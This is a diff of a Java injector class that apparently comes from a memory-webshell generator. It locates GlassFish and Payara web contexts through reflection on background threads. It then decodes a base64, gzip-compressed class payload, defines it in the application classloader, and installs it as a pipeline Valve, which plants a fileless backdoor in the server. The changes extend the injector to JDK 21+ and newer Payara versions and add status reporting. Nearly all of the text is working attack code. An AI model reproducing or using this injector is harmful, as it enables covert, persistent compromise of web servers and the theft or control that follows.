@@ -3,21 +3,27 @@ package org.leo.jmg.mem.injectortpl.glassfish;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class GlassFishValveInjector {
 
+    private static String msg = "";
+    private static boolean ok = false;
 
-    private static boolean ok;
+    public String getClassName() {
+        return "{{className}}";
+    }
 
-    private static String shellClassName;
-    private static String shellClass;
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
+
 
     public GlassFishValveInjector() {
         if (ok) {
@@ -27,24 +33,41 @@ public class GlassFishValveInjector {
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                    
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                    
+                    msg += "[/*] ready\n";
                 } catch (Throwable e) {
-                    
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
- 
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public Set<Object> getContext() throws Exception {
@@ -52,7 +75,15 @@ public class GlassFishValveInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Object target = getThreadTarget(thread);
+                if (target == null) {
+                    continue;
+                }
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
@@ -61,6 +92,40 @@ public class GlassFishValveInjector {
             }
         }
         return contexts;
+    }
+
+    private Object getThreadTarget(Thread thread) throws Exception {
+        try {
+            return getFieldValue(thread, "target");
+        } catch (NoSuchFieldException e) {
+            // JDK 21+
+            return getFieldValue(getFieldValue(thread, "holder"), "task");
+        }
+    }
+
+    /**
+     * Older GlassFish/Payara: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        try {
+            return getFieldValue(target, "this$0");
+        } catch (NoSuchFieldException ignored) {
+        }
+        try {
+            Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+            Object base = getFieldValue(atomic, "base");
+            if (base instanceof java.lang.ref.Reference) {
+                return ((java.lang.ref.Reference<?>) base).get();
+            }
+            return base;
+        } catch (NoSuchFieldException ignored) {
+        }
+        Object base = getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
@@ -72,29 +137,30 @@ public class GlassFishValveInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         // OSGI 类加载限制，加密相关函数找不到，这儿不得不使用 WebAppClassLoader
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
-    
+    @SuppressWarnings("all")
     public void inject(Object context, Object valve) throws Exception {
         Object pipeline = invokeMethod(context, "getPipeline", null, null);
         Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
         List<Object> valvesList = Arrays.asList(valves);
         for (Object v : valvesList) {
-            if (v.getClass().getName().contains(shellClassName)) {
+            if (v.getClass().getName().contains(getClassName())) {
                 return;
             }
         }
@@ -102,9 +168,12 @@ public class GlassFishValveInjector {
         invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
-
-    
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -117,7 +186,7 @@ public class GlassFishValveInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -137,7 +206,7 @@ public class GlassFishValveInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws Exception {
         Class<?> clazz = obj.getClass();
         while (clazz != Object.class) {
@@ -152,7 +221,7 @@ public class GlassFishValveInjector {
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
@@ -178,5 +247,18 @@ public class GlassFishValveInjector {
         }
     }
 
-
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
